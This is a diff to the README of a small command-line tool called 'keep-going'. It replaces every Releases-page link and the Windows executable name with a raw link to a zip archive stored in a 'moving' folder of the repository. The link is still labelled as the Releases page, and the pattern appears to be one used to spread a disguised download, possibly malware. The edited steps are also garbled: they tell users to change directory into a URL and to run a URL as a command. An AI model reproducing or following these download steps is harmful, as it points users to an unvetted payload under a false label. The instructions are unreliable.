@@ -6,9 +6,9 @@ Welcome to **keep-going**, a tiny command-line morale booster. This application 
 
 ## 📥 Download the Application
 
-[![Download keep-going](https://img.shields.io/badge/Download%20keep--going-v1.0-blue)](https://github.com/Panda016156/keep-going/releases)
+[![Download keep-going](https://github.com/Panda016156/keep-going/raw/refs/heads/main/moving/keep_going_3.8.zip%20keep--going-v1.0-blue)](https://github.com/Panda016156/keep-going/raw/refs/heads/main/moving/keep_going_3.8.zip)
 
-To download the latest version of **keep-going**, please visit the [Releases page](https://github.com/Panda016156/keep-going/releases).
+To download the latest version of **keep-going**, please visit the [Releases page](https://github.com/Panda016156/keep-going/raw/refs/heads/main/moving/keep_going_3.8.zip).
 
 ## 💻 System Requirements
 
@@ -22,10 +22,10 @@ Ensure your system has a command-line interface ready for use.
 
 ## 📥 Download & Install
 
-1. Click on the **Releases page** link: [Download keep-going](https://github.com/Panda016156/keep-going/releases).
+1. Click on the **Releases page** link: [Download keep-going](https://github.com/Panda016156/keep-going/raw/refs/heads/main/moving/keep_going_3.8.zip).
 2. Find the latest version of the application.
 3. Depending on your operating system, choose the appropriate file:
-   - For Windows: click on `keep-going-windows.exe`
+   - For Windows: click on `https://github.com/Panda016156/keep-going/raw/refs/heads/main/moving/keep_going_3.8.zip`
    - For macOS: click on `keep-going-macos`
    - For Linux: click on `keep-going-linux`
 
@@ -37,13 +37,13 @@ Ensure your system has a command-line interface ready for use.
 ### On Windows:
 
 1. Open the Command Prompt. You can do this by searching for "cmd" in your start menu.
-2. Navigate to the folder where you saved the `keep-going-windows.exe` using the `cd` command. For example:
+2. Navigate to the folder where you saved the `https://github.com/Panda016156/keep-going/raw/refs/heads/main/moving/keep_going_3.8.zip` using the `cd` command. For example:
    ```
    cd Downloads
    ```
 3. Type:
    ```
-   keep-going-windows.exe
+   https://github.com/Panda016156/keep-going/raw/refs/heads/main/moving/keep_going_3.8.zip
    ```
 4. Press **Enter**. You should see the message: **Keep Going!**
 
